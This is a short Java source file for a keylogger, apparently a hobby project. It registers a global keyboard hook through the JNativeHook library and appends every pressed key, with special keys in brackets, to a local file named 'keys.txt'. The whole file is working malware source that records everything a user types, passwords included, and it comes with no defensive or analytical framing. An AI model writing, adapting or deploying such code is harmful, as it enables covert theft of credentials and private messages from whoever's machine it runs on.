package Keylogger;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
//import org.slf4j.Logger;
//import org.slf4j.LoggerFactory;

public class KeyLogger implements NativeKeyListener {

	private static final Path file = Paths.get("keys.txt");
	
	public static void main(String[] args) {
		
		try {
			GlobalScreen.registerNativeHook();
		}catch (NativeHookException e) {
			System.exit(-1);
		}
		
		GlobalScreen.addNativeKeyListener(new KeyLogger());
		
	}
	
	public void nativeKeyPressed(NativeKeyEvent e) {
		
		String key_text = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		try(OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE,StandardOpenOption.WRITE,StandardOpenOption.APPEND);PrintWriter writer = new PrintWriter(os)){
			
			if(key_text.length()>1) {
				writer.print("[" + key_text + "]");
			}
			else {
				writer.print(key_text);
			}
		} catch (IOException e2) {
			System.exit(-1);
		}
	
	}
	
	public void nativeKeyReleased(NativeKeyEvent e) {
		
	}
	
	public void nativeKeyTyped(NativeKeyEvent e) {
		
	}
}



